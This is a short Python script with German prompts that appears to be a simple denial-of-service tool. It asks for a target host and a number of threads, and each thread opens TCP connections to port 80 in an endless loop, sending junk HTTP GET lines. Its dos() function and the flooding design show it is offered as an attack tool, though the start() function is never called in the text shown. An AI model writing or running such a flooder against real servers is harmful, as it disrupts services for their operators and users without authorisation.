import socket
from threading import Thread

host = input("Bitte Host eingeben: \r\n")
ip = socket.gethostbyname(host)
#ip = host
port = 80
count = int(input("Bitte die Anzahl der Threads eingeben: "))
print("IP:" + ip)

def dos():
    while True:
        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            mysocket.connect((ip, port))
            mysocket.send(str.encode("GET " + "BlaBla das ist Muell" + "HTTP/1.1 \r\n"))
            mysocket.sendto(str.encode("GET " + "BlaBla das ist Muell" + "HTTP/1.1 \r\n"), (ip, port))
            #print("send")
        except socket.error:
            print("error")
        mysocket.close()

def start():
    for i in range(count):
        t = Thread(target=dos)
        t.start()